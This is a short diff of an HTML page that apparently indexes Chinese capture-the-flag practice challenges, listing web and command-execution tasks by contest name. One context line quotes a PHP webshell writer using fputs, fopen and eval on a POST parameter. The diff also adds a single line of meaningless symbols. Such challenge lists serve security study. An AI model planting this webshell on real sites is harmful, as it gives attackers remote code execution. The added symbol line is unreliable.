@@ -1828,6 +1828,7 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <li>[WMCTF2020]Web Check in 一个题目，这个有非预期</li>
 <li>[CISCN2021 Quals]filter yii2 laravel LFI 的CVE改的</li>
 </ul>
+<p>#!(@&amp;,!’^@@`@@@@</p>
 <h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="简单-5"><a href="#简单-5" class="headerlink" title="简单"></a>简单</h3><ul>
 <li>ACTF2020 新生赛]Exec 基础的命令执行</li>
 <li>[BUUCTF]Easybypass 很少的过滤</li>
